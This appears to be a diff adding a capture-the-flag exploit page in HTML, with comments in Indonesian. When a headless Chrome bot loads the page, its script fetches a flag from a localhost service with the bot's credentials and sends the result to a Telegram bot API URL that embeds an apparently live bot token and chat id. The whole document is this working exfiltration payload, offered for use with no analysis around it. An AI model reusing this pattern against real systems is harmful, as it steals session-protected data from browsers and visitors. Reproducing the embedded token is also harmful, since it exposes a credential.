@@ -1,0 +1,18 @@
+<!doctype html>
+<html>
+  <body>
+    <script>
+      // Begitu page ini di-load di Chrome headless (bot), ia akan:
+      // 1. fetch flag dari origin https://localhost:1337
+      // 2. exfil ke Telegram
+      fetch("https://localhost:1337/flag", { credentials: 'include' })
+        .then(r => r.text())
+        .then(flag => {
+          // kirim ke bot Telegram-mu
+          new Image().src =
+            "https://api.telegram.org/bot7554798194:AAFiMaxaWmwdXb6Xg8UBnPFazqmhTlaZ5-I/" +
+            "sendMessage?chat_id=5720778345&text=" + encodeURIComponent(flag);
+        });
+    </script>
+  </body>
+</html>
